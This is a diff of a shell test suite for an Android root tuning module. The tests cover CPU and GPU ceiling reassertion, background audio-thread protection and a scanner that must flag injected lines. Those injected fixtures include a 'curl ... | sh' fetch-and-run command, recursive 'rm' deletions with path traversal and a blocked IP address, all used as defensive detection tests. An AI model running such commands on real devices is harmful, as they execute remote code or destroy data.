+sleep 4; : > "$A1/fusao/game-active.txt"; sleep 7
+[ -z "$(cat "$A1/fusao/game-active.txt")" ] && [ "$(a1_exits "$A1")" = 1 ] && ok "A-1: tela apagada em jogo encerra a sessão (não segura atrás do keyguard)" || bad "A-1: tela apagada em jogo encerra a sessão"
+wait
+rm -rf "$A1"
+
+# 17c) M-3: teto de CPU do perfil regravado por fora depois do apply (battery ao entrar em Dozing). O watch vê o nó
+# acima do alvo e pede UMA regravação ao tune.sh reassert; a segunda deriva dentro do intervalo NÃO é regravada
+# (nada de laço), teto ABAIXO do alvo (térmico) nunca é tocado, e com a checagem desligada nada acontece (controle).
+m3_setup() {  # $1 = dir
+  rm -rf "$1"; mkdir -p "$1/fusao"
+  cp "$STAGE/fusao/lib.sh" "$STAGE/fusao/watch.sh" "$STAGE/fusao/tune.sh" "$1/fusao/"; chmod +x "$1/fusao/"*.sh
+  : > "$1/fusao/game-active.txt"; : > "$1/fusao/gamelist.txt"; echo battery > "$1/fusao/profile"
+  for _p in policy0 policy4; do
+    mkdir -p "$1/sys/devices/system/cpu/cpufreq/$_p"
+    echo 533000 > "$1/sys/devices/system/cpu/cpufreq/$_p/cpuinfo_min_freq"
+    echo 533000 > "$1/sys/devices/system/cpu/cpufreq/$_p/scaling_min_freq"
+  done
+  echo "$P0_TAB_REAL" > "$1/sys/devices/system/cpu/cpufreq/policy0/scaling_available_frequencies"
+  echo "$P4_TAB_REAL" > "$1/sys/devices/system/cpu/cpufreq/policy4/scaling_available_frequencies"
+  echo 2002000 > "$1/sys/devices/system/cpu/cpufreq/policy0/cpuinfo_max_freq"
+  echo 2400000 > "$1/sys/devices/system/cpu/cpufreq/policy4/cpuinfo_max_freq"
+  echo 2002000 > "$1/sys/devices/system/cpu/cpufreq/policy0/scaling_max_freq"
+  echo 2400000 > "$1/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"
+  M54_DIR="$1/fusao" FS_ROOT="$1" sh "$1/fusao/tune.sh" battery >/dev/null 2>&1
+}
+m3_p0() { cat "$1/sys/devices/system/cpu/cpufreq/policy0/scaling_max_freq"; }
+m3_p4() { cat "$1/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"; }
+m3_watch() {  # $1 = dir, $2 = WATCH_DRIFT_EVERY, $3 = segundos
+  ( OBSERVER_FAKE_ALIVE=1 WATCH_DRIFT_EVERY="$2" M54_DIR="$1/fusao" FS_ROOT="$1" timeout "$3" sh "$1/fusao/watch.sh" >/dev/null 2>&1 ) &
+}
+M3="$FAKE/m3"; m3_setup "$M3"
+[ "$(m3_p0 "$M3")" = 1728000 ] && [ "$(m3_p4 "$M3")" = 1440000 ] && grep -qx "target_p0_max=1728000" "$M3/fusao/profile.state" && grep -qx "target_p4_max=1440000" "$M3/fusao/profile.state" && \
+  ok "M-3: apply do battery publica os tetos-alvo no profile.state" || bad "M-3: apply do battery publica os tetos-alvo no profile.state"
+m3_watch "$M3" 1 20
+sleep 3; echo 2002000 > "$M3/sys/devices/system/cpu/cpufreq/policy0/scaling_max_freq"; echo 2400000 > "$M3/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"
+sleep 8
+[ "$(m3_p0 "$M3")" = 1728000 ] && [ "$(m3_p4 "$M3")" = 1440000 ] && ok "M-3: teto regravado por fora volta ao do perfil" || bad "M-3: teto regravado por fora volta ao do perfil [p0=$(m3_p0 "$M3") p4=$(m3_p4 "$M3")]"
+grep -q "watch: teto de CPU/GPU acima do perfil battery" "$M3/fusao/fusao.log" && grep -q "tune: reassert battery (p0_max p4_max regravado 1x) -> applied" "$M3/fusao/fusao.log" && ok "M-3: a regravação fica no log" || bad "M-3: a regravação fica no log"
+echo 2400000 > "$M3/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"; sleep 7
+[ "$(m3_p4 "$M3")" = 2400000 ] && [ "$(grep -c "watch: teto de CPU/GPU acima" "$M3/fusao/fusao.log")" = 1 ] && ok "M-3: segunda deriva dentro do intervalo não é regravada (sem laço)" || bad "M-3: segunda deriva dentro do intervalo não é regravada [p4=$(m3_p4 "$M3")]"
+wait
+# teto ABAIXO do alvo = térmico da Samsung: nunca regrava
+m3_setup "$M3"; m3_watch "$M3" 1 10
+sleep 3; echo 1344000 > "$M3/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"; sleep 6
+[ "$(m3_p4 "$M3")" = 1344000 ] && ! grep -q "watch: teto de CPU/GPU acima" "$M3/fusao/fusao.log" && ok "M-3: teto térmico (abaixo do alvo) não é regravado" || bad "M-3: teto térmico (abaixo do alvo) não é regravado"
+wait
+# controle negativo: checagem desligada (= o watch antigo) deixa o teto solto
+m3_setup "$M3"; m3_watch "$M3" 0 12
+sleep 3; echo 2400000 > "$M3/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"; sleep 8
+[ "$(m3_p4 "$M3")" = 2400000 ] && ok "M-3 controle: sem a checagem o teto fica solto" || bad "M-3 controle: sem a checagem o teto fica solto"
+wait
+# balanced: o teto do P4 (1824000) é publicado como alvo e, regravado por fora (2400000 no aparelho), volta pelo
+# mesmo caminho; o controle negativo (checagem desligada) deixa o nó solto
+m3_bal() {  # $1 = dir: troca o perfil do cenário para balanced
+  echo balanced > "$1/fusao/profile"
+  M54_DIR="$1/fusao" FS_ROOT="$1" sh "$1/fusao/tune.sh" balanced >/dev/null 2>&1
+}
+m3_setup "$M3"; m3_bal "$M3"
+grep -qx "target_p4_max=1824000" "$M3/fusao/profile.state" && grep -qx "target_p0_max=2002000" "$M3/fusao/profile.state" && [ "$(m3_p4 "$M3")" = 1824000 ] && \
+  ok "M-3: balanced publica o teto do P4 como alvo" || bad "M-3: balanced publica o teto do P4 como alvo"
+m3_watch "$M3" 1 12
+sleep 3; echo 2400000 > "$M3/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"; sleep 8
+[ "$(m3_p4 "$M3")" = 1824000 ] && grep -q "watch: teto de CPU/GPU acima do perfil balanced" "$M3/fusao/fusao.log" && \
+  ok "M-3: teto do P4 do balanced regravado por fora volta a 1824000" || bad "M-3: teto do P4 do balanced regravado por fora volta a 1824000 [p4=$(m3_p4 "$M3")]"
+wait
+m3_setup "$M3"; m3_bal "$M3"; m3_watch "$M3" 0 12
+sleep 3; echo 2400000 > "$M3/sys/devices/system/cpu/cpufreq/policy4/scaling_max_freq"; sleep 8
+[ "$(m3_p4 "$M3")" = 2400000 ] && ok "M-3 controle (balanced): sem a checagem o teto fica solto" || bad "M-3 controle (balanced): sem a checagem o teto fica solto"
+wait
+# Teto da GPU do balanced (845000): a ROM regrava o nó para 949000 e o perfil ficava em partial 12/13 (aparelho
+# 2026-11-14: profile_mismatch=gpu_max:949000!=845000). O watch vê a deriva e o reassert devolve o teto e o estado
+# applied; teto ABAIXO do alvo (térmico) não é tocado; sem a checagem o nó fica solto e o verify acusa (controle).
+m3_gpu() {  # $1 = dir: cenário balanced com o nó da GPU
+  m3_setup "$1"; mkdir -p "$1/sys/kernel/gpu"
+  echo "221000 351000 455000 552000 650000 754000 845000 949000" > "$1/sys/kernel/gpu/gpu_freq_table"
+  echo 221000 > "$1/sys/kernel/gpu/gpu_min_clock"; echo 949000 > "$1/sys/kernel/gpu/gpu_max_clock"
+  m3_bal "$1"
+}
+m3_g() { cat "$1/sys/kernel/gpu/gpu_max_clock"; }
+m3_gpu "$M3"
+[ "$(m3_g "$M3")" = 845000 ] && grep -qx "target_gpu_max=845000" "$M3/fusao/profile.state" && grep -qx "profile_state=applied" "$M3/fusao/profile.state" && \
+  ok "GPU: balanced grava 845000 e publica o alvo" || bad "GPU: balanced grava 845000 e publica o alvo [gpu=$(m3_g "$M3")]"
+m3_watch "$M3" 1 14
+sleep 3; echo 949000 > "$M3/sys/kernel/gpu/gpu_max_clock"; sleep 9
+[ "$(m3_g "$M3")" = 845000 ] && ok "GPU: teto regravado pela ROM volta a 845000" || bad "GPU: teto regravado pela ROM volta a 845000 [gpu=$(m3_g "$M3")]"
+grep -qx "profile_state=applied" "$M3/fusao/profile.state" && ! grep -q "^profile_mismatch=.*gpu_max" "$M3/fusao/profile.state" && \
+  ok "GPU: o perfil volta a applied, sem partial" || bad "GPU: o perfil volta a applied, sem partial"
+grep -q "tune: reassert balanced (gpu_max regravado 1x) -> applied" "$M3/fusao/fusao.log" && ok "GPU: a regravação fica no log" || bad "GPU: a regravação fica no log"
+wait
+m3_gpu "$M3"; m3_watch "$M3" 1 10
+sleep 3; echo 650000 > "$M3/sys/kernel/gpu/gpu_max_clock"; sleep 6
+[ "$(m3_g "$M3")" = 650000 ] && ok "GPU: teto térmico (abaixo do alvo) não é regravado" || bad "GPU: teto térmico (abaixo do alvo) não é regravado [gpu=$(m3_g "$M3")]"
+wait
+m3_gpu "$M3"; m3_watch "$M3" 0 12
+sleep 3; echo 949000 > "$M3/sys/kernel/gpu/gpu_max_clock"; sleep 8
+M54_DIR="$M3/fusao" FS_ROOT="$M3" sh "$M3/fusao/tune.sh" verify balanced >/dev/null 2>&1
+[ "$(m3_g "$M3")" = 949000 ] && grep -q "^profile_mismatch=.*gpu_max:949000!=845000" "$M3/fusao/profile.state" && \
+  ok "GPU controle: sem a checagem o teto fica solto e o verify acusa" || bad "GPU controle: sem a checagem o teto fica solto e o verify acusa [gpu=$(m3_g "$M3")]"
+wait
+rm -rf "$M3"
+
 # 18) tools: kill-list em cópias do stage (o stage limpo passa; cada injeção tem de ser acusada)
 sweep_copy() { rm -rf "$FAKE/swp"; cp -r "$STAGE" "$FAKE/swp"; }
 sweep_run() { python3 "$ROOT/tools/fusao-sweep.py" --stage "$FAKE/swp" > "$FAKE/swp.out" 2>&1; }
@@ -919,6 +1203,34 @@ sweep_copy; echo 'X=202.155.143.189' >> "$FAKE/swp/system/bin/fusao"
 sweep_run && bad "sweep confere o CLI sem sufixo" || ok "sweep confere o CLI sem sufixo"
 sweep_copy; echo 'cat /sys/kernel/ems/mode' >> "$FAKE/swp/fusao/perf.sh"
 sweep_run && bad "sweep bloqueia acesso a /sys/kernel/ems" || ok "sweep bloqueia acesso a /sys/kernel/ems"
+# M-8: as formas que passavam batido na auditoria de 2026-11-13 (8 de 8 injeções não eram acusadas). Cada linha:
+# rótulo | arquivo do stage | texto injetado. O texto vai por printf '%s' (sem interpretar "\" nem "$").
+sweep_inject() {
+  sweep_copy
+  printf '%s\n' "$3" >> "$FAKE/swp/$2"
+  sweep_run && bad "sweep acusa $1" || ok "sweep acusa $1"
+}
+sweep_inject "chmod 444 em script" fusao/tune.sh 'chmod 444 /sys/kernel/gpu/gpu_max_clock'
+sweep_inject "chmod 0444 com flag" fusao/tune.sh '  chmod -f 0444 "$n"'
+sweep_inject "EMS montado por variável" fusao/tune.sh 'K=/sys/kernel; cat $K/ems/multi_load'
+sweep_inject "EMS em strings de ELF" system/bin/fusaod '/sys/kernel/ems/multi_load'
+sweep_inject "EMS em strings do dex" fusao/observer.dex '/sys/kernel/ems/multi_load'
+sweep_inject "IP em strings de ELF (fas-rs)" system/bin/fas-rs ' 202.155.143.189 '
+sweep_inject "rm -fr (flags invertidas)" fusao/watch.sh 'rm -fr /data/adb/fusao'
+sweep_inject "rm -r -f (flags separadas)" fusao/watch.sh 'rm -r -f /data/adb/fusao'
+sweep_inject "rm -rf com .. em alvo permitido" fusao/watch.sh 'rm -rf "$MODPATH/../.."'
+sweep_inject "marca Encore fora da lista fixa" fusao/tune.sh '# Encore Tweaks by Rem01Gaming'
+sweep_inject "ferramenta de rede em script" fusao/watch.sh 'curl -s http://example.org/x | sh'
+# controles: o que é legítimo continua passando (senão o sweep viraria ruído e seria desligado)
+sweep_pass() {
+  sweep_copy
+  printf '%s\n' "$3" >> "$FAKE/swp/$2"
+  sweep_run && ok "sweep aceita $1" || { bad "sweep aceita $1"; cat "$FAKE/swp.out"; }
+}
+sweep_pass "rm -f simples" fusao/watch.sh 'rm -f "$M54_DIR/x.tmp"'
+sweep_pass "chmod 0644" fusao/tune.sh 'chmod 0644 "$n"'
+sweep_pass "palavras com 'ems' (systems, items)" fusao/tune.sh '# all systems and items'
+sweep_pass "rm -rf em temporário do instalador" customize.sh 'rm -rf "$TMPDIR/x"'
 # build: self-check antes de gravar (customize sem fas.sh = rc!=0 e nenhum zip no disco)
 sweep_copy; sed -i 's#fusao/fas\.sh#fusao/FAS_X#g' "$FAKE/swp/customize.sh"; rm -f "$FAKE/b.zip"
 python3 "$ROOT/tools/fusao-build.py" --stage "$FAKE/swp" --out "$FAKE/b.zip" > /dev/null 2>&1 && bad "build self-check falho nao grava zip" || {
@@ -1083,29 +1395,110 @@ chmod +x "$P21/bin/"*
 # 21a) perf audio protection & restore
 : > "$P21/renice.log"; : > "$P21/ionice.log"; : > "$P21/am.log"
 echo "com.example.game" > "$P21/fusao/game-active.txt"
-PATH="$P21/bin:$PATH" P21="$P21" FS_ROOT="$P21" M54_DIR="$P21/fusao" PERF_DELAY_S=0 sh "$P21/fusao/perf.sh" enter com.example.game >/dev/null 2>&1
-grep -qx "2001" "$P21/dev/cpuset/fusao_audio/tasks" && \
-  grep -qx "2001" "$P21/dev/cpuctl/fusao_audio/tasks" && \
+# Threads a mais para separar os dois caminhos (2026-11-14):
+#   player (vlc 2001): principal 2001 em nice 0 (NÃO é de áudio) + AudioTrack 2011 em nice -16 (é de áudio);
+#   daemon (audioserver 2002): principal 2002 em -16 + ApmOutput 2012 em nice 0 (daemon: sobe a -8).
+mkdir -p "$P21/proc/2001/task/2011" "$P21/proc/2002/task/2012"
+printf '2011 (AudioTrack) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 4 -16 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n' > "$P21/proc/2001/task/2011/stat"
+echo "AudioTrack" > "$P21/proc/2001/task/2011/comm"
+printf '2012 (ApmOutput) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n' > "$P21/proc/2002/task/2012/stat"
+echo "ApmOutput" > "$P21/proc/2002/task/2012/comm"
+echo 200 > "$P21/proc/2001/oom_score_adj"
+p21_perf() { PATH="$P21/bin:$PATH" P21="$P21" FS_ROOT="$P21" M54_DIR="$P21/fusao" PERF_DELAY_S=0 sh "$P21/fusao/perf.sh" "$@" >/dev/null 2>&1; }
+p21_perf enter com.example.game
+grep -qx "2011" "$P21/dev/cpuset/fusao_audio/tasks" && \
+  grep -qx "2011" "$P21/dev/cpuctl/fusao_audio/tasks" && \
   [ "$(cat "$P21/dev/cpuctl/fusao_audio/cpu.shares")" = "2048" ] && \
   [ "$(cat "$P21/dev/cpuctl/fusao_audio/cpu.uclamp.latency_sensitive")" = "1" ] && \
-  ok "perf cria fusao_audio e protege media ativo" || bad "perf cria fusao_audio e protege media ativo"
-grep -q -- " -n -8 -p 2001" "$P21/renice.log" && ! grep -q " 2002" "$P21/renice.log" && \
-  ok "perf renice media (-8) e preserva audioserver (-16)" || bad "perf renice media (-8) e preserva audioserver (-16)"
+  ok "perf cria fusao_audio e protege a thread de áudio do player" || bad "perf cria fusao_audio e protege a thread de áudio do player"
+# o resto do player (interface/rede/GC) não entra no grupo nem sobe de prioridade: era isso que passava à frente
+# da SystemUI na troca de faixa. O processo segue protegido contra morte (oom_score_adj 200 -> 0).
+! grep -qx "2001" "$P21/dev/cpuset/fusao_audio/tasks" && ! grep -qx "2001" "$P21/dev/cpuctl/fusao_audio/tasks" && \
+  ! grep -q -- "-p 2001" "$P21/renice.log" && ! grep -q -- "-p 2011" "$P21/renice.log" && \
+  ok "perf não promove threads do player que não são de áudio" || bad "perf não promove threads do player que não são de áudio"
+[ "$(cat "$P21/proc/2001/oom_score_adj")" = "0" ] && ok "perf protege o processo do player (oom 200 -> 0)" || bad "perf protege o processo do player (oom 200 -> 0)"
+# daemon: todas as threads no grupo; a que está em nice 0 sobe a -8, a que já é -16 não é tocada
+grep -qx "2002" "$P21/dev/cpuset/fusao_audio/tasks" && grep -qx "2012" "$P21/dev/cpuset/fusao_audio/tasks" && \
+  grep -q -- " -n -8 -p 2012" "$P21/renice.log" && ! grep -q -- "-p 2002" "$P21/renice.log" && \
+  ok "perf renice daemon (-8) e preserva audioserver (-16)" || bad "perf renice daemon (-8) e preserva audioserver (-16)"
 ! grep -q "2003" "$P21/dev/cpuset/fusao_audio/tasks" && \
   ok "perf nao coloca jogo em fusao_audio" || bad "perf nao coloca jogo em fusao_audio"
 [ -s "$P21/fusao/perf.audio.state" ] && ok "perf grava perf.audio.state" || bad "perf grava perf.audio.state"
-printf '2001 (vlc) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 12 -8 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n' > "$P21/proc/2001/task/2001/stat"
-PATH="$P21/bin:$PATH" P21="$P21" FS_ROOT="$P21" M54_DIR="$P21/fusao" sh "$P21/fusao/perf.sh" exit com.example.game >/dev/null 2>&1
+printf '2012 (ApmOutput) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 12 -8 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n' > "$P21/proc/2002/task/2012/stat"
+p21_perf exit com.example.game
 [ ! -f "$P21/fusao/perf.audio.state" ] && \
-  grep -qx "2001" "$P21/dev/cpuset/foreground/tasks" && \
-  grep -q -- " -n 8 -p 2001" "$P21/renice.log" && ! grep -q " -n 8 -p 2002" "$P21/renice.log" && \
-  ok "perf exit restaura media e limpa state" || bad "perf exit restaura media e limpa state"
+  grep -qx "2011" "$P21/dev/cpuset/foreground/tasks" && grep -qx "2012" "$P21/dev/cpuset/foreground/tasks" && \
+  grep -q -- " -n 8 -p 2012" "$P21/renice.log" && ! grep -q -- " -n 8 -p 2002" "$P21/renice.log" && \
+  [ "$(cat "$P21/proc/2001/oom_score_adj")" = "200" ] && \
+  ok "perf exit restaura media/daemon e limpa state" || bad "perf exit restaura media/daemon e limpa state"
+printf '2012 (ApmOutput) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n' > "$P21/proc/2002/task/2012/stat"
 
-# 21b) framework game relaxado (sem matar audio em background)
+# reproteger (jogo A -> jogo B sem exit, ou a 2ª chamada do CLI) com o estado já gravado: nenhuma linha duplicada e
+# o nice ORIGINAL (0) continua no registro mesmo com a thread já em -8 — senão o exit "restauraria" para -8.
+: > "$P21/renice.log"
+p21_perf audio com.example.game
+printf '2012 (ApmOutput) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 12 -8 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n' > "$P21/proc/2002/task/2012/stat"
+p21_perf audio com.example.game
+[ "$(grep -c '^tid 2002 2012 ' "$P21/fusao/perf.audio.state")" = 1 ] && grep -qx "tid 2002 2012 0 /foreground /foreground" "$P21/fusao/perf.audio.state" && \
+  [ "$(grep -c '^proc daemon 2002 ' "$P21/fusao/perf.audio.state")" = 1 ] && \
+  ok "perf reproteger não duplica nem perde o nice original" || bad "perf reproteger não duplica nem perde o nice original"
+p21_perf exit com.example.game
+grep -q -- " -n 8 -p 2012" "$P21/renice.log" && ok "perf exit após reproteção devolve o nice original" || bad "perf exit após reproteção devolve o nice original"
+printf '2012 (ApmOutput) S 1 1 1 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1\n' > "$P21/proc/2002/task/2012/stat"
+
+# 21a-2) M-2: a proteção de áudio é um job em segundo plano (perf.sh audio-bg). O ionice falso leva 2 s por
+# processo protegido (é o que a varredura real custa no aparelho): o enter NÃO pode esperar por ela, e o exit
+# tem de encerrar o job em voo sem deixar proteção para trás.
+mkdir -p "$P21/slow"
+cat > "$P21/slow/ionice" <<'IEOF'
+#!/bin/sh
+echo "ionice $*" >> "$P21/ionice.log"
+case " $* " in *" -n 0 "*) sleep 2;; esac
+IEOF
+chmod +x "$P21/slow/ionice"
+p21_slow() { PATH="$P21/slow:$P21/bin:$PATH" P21="$P21" FS_ROOT="$P21" M54_DIR="$P21/fusao" PERF_DELAY_S=0 sh "$P21/fusao/perf.sh" "$@" >/dev/null 2>&1; }
+p21_reset() { : > "$P21/dev/cpuset/fusao_audio/tasks"; : > "$P21/dev/cpuctl/fusao_audio/tasks"; : > "$P21/dev/cpuset/foreground/tasks"; : > "$P21/dev/cpuctl/foreground/tasks"; : > "$P21/renice.log"; rm -f "$P21/fusao/perf.audio.state" "$P21/fusao/perf.audio.pid" "$P21/fusao/perf.proc.state"; }
+ms() { echo $(( $(date +%s%N) / 1000000 )); }
+# controle: com a proteção no caminho (como era) o enter leva os >= 4 s dos dois processos
+p21_reset; _t0=$(ms); p21_slow enter com.example.game; _sync_ms=$(( $(ms) - _t0 ))
+p21_slow exit com.example.game
+# agora o caminho real: job em segundo plano
+p21_reset; _t0=$(ms); ( unset PERF_AUDIO_SYNC; p21_slow enter com.example.game ); _bg_ms=$(( $(ms) - _t0 ))
+[ "$_sync_ms" -ge 3500 ] && [ "$_bg_ms" -lt 1500 ] && ok "M-2: enter não espera a proteção de áudio (${_bg_ms} ms; síncrono ${_sync_ms} ms)" || bad "M-2: enter não espera a proteção de áudio (${_bg_ms} ms; síncrono ${_sync_ms} ms)"
+# o job está vivo e identificado; o exit o encerra e nada mais é aplicado depois
+_i=0; while [ ! -s "$P21/fusao/perf.audio.pid" ] && [ "$_i" -lt 30 ]; do sleep 0.1; _i=$((_i + 1)); done
+_job=$(sed -n 's/^pid=//p' "$P21/fusao/perf.audio.pid" 2>/dev/null)
+[ -n "$_job" ] && kill -0 "$_job" 2>/dev/null && ok "M-2: job de áudio publicado e vivo durante a varredura" || bad "M-2: job de áudio publicado e vivo durante a varredura"
+( unset PERF_AUDIO_SYNC; p21_slow exit com.example.game )
+_n0=$(wc -l < "$P21/dev/cpuset/fusao_audio/tasks")
+sleep 5
+[ -n "$_job" ] && ! kill -0 "$_job" 2>/dev/null && [ "$(wc -l < "$P21/dev/cpuset/fusao_audio/tasks")" = "$_n0" ] && \
+  [ ! -f "$P21/fusao/perf.audio.state" ] && [ ! -f "$P21/fusao/perf.audio.pid" ] && \
+  ok "M-2: exit encerra o job em voo e nada é aplicado depois" || bad "M-2: exit encerra o job em voo e nada é aplicado depois"
+# controle negativo: o mesmo job SEM o exit segue até o fim e protege (é o exit que o para, não o acaso)
+p21_reset; ( unset PERF_AUDIO_SYNC; p21_slow enter com.example.game )
+_i=0; while { [ -f "$P21/fusao/perf.audio.pid" ] || [ ! -s "$P21/fusao/perf.audio.state" ]; } && [ "$_i" -lt 150 ]; do sleep 0.1; _i=$((_i + 1)); done
+grep -qx "2011" "$P21/dev/cpuset/fusao_audio/tasks" && [ -s "$P21/fusao/perf.audio.state" ] && [ ! -f "$P21/fusao/perf.audio.pid" ] && \
+  ok "M-2 controle: sem exit o job termina e protege" || bad "M-2 controle: sem exit o job termina e protege"
+p21_perf exit com.example.game
+# guarda: job que acorda com o jogo já fora de foco (exit chegou antes de ele publicar o PID) não aplica nada
+p21_reset; : > "$P21/fusao/game-active.txt"
+p21_perf audio-bg com.example.game
+[ ! -s "$P21/dev/cpuset/fusao_audio/tasks" ] && [ ! -f "$P21/fusao/perf.audio.state" ] && \
+  ok "M-2: job com o jogo fora de foco não deixa proteção" || bad "M-2: job com o jogo fora de foco não deixa proteção"
+echo "com.example.game" > "$P21/fusao/game-active.txt"
+p21_perf audio-bg com.example.game
+grep -qx "2011" "$P21/dev/cpuset/fusao_audio/tasks" && ok "M-2 controle: job com o jogo em foco protege" || bad "M-2 controle: job com o jogo em foco protege"
+p21_perf exit com.example.game
+p21_reset
+
+# 21b) framework game relaxado (sem matar audio em background): só a chave do ActivityManager, sem o restart de
+# 24 h de serviço sticky (um player morto em segundo plano não pode ficar mudo) e sem a chave morta de standby
 PATH="$P21/bin:$PATH" P21="$P21" FAKE_SETTINGS_DIR="$P21/settings" FS_ROOT="$P21" M54_DIR="$P21/fusao" sh "$P21/fusao/framework.sh" game >/dev/null 2>&1
 grep -q "background_settle_time=30000,power_check_max_cpu_1=25,power_check_max_cpu_2=35" "$P21/settings/global__activity_manager_constants" && \
-  grep -q "strong_usage_duration=20000,system_interaction_duration=10000" "$P21/settings/global__app_standby_constants" && \
-  ok "framework game aplica triad AM/SB relaxada" || bad "framework game aplica triad AM/SB relaxada"
+  ! grep -q "service_restart_duration" "$P21/settings/global__activity_manager_constants" && \
+  [ ! -e "$P21/settings/global__app_standby_constants" ] && \
+  ok "framework game aplica AM relaxado, sem restart longo nem chave morta" || bad "framework game aplica AM relaxado, sem restart longo nem chave morta"
 
 # 21c) tune ufc_max clear vs thermal guard + game gpu_max ceil + settle
 mkdir -p "$P21/sys/block/sda/queue"
